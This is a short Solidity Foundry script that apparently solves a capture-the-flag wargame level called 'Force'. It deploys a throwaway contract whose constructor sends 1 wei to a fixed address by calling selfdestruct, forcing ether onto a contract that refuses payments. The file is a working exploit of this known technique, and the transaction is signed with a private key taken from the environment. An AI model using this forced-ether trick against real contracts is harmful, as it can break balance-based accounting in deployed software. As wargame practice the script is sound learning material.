// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Tobedestructed {

constructor(address payable _ForceAddress) payable {

    selfdestruct(_ForceAddress);
}

}

contract ForceSolution is Script {

    function run() external {

      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      
      new Tobedestructed{value: 1 wei} (payable(0x3232777224E42F96cDe9820f665B745273f258A4));

      vm.stopBroadcast();
    }

}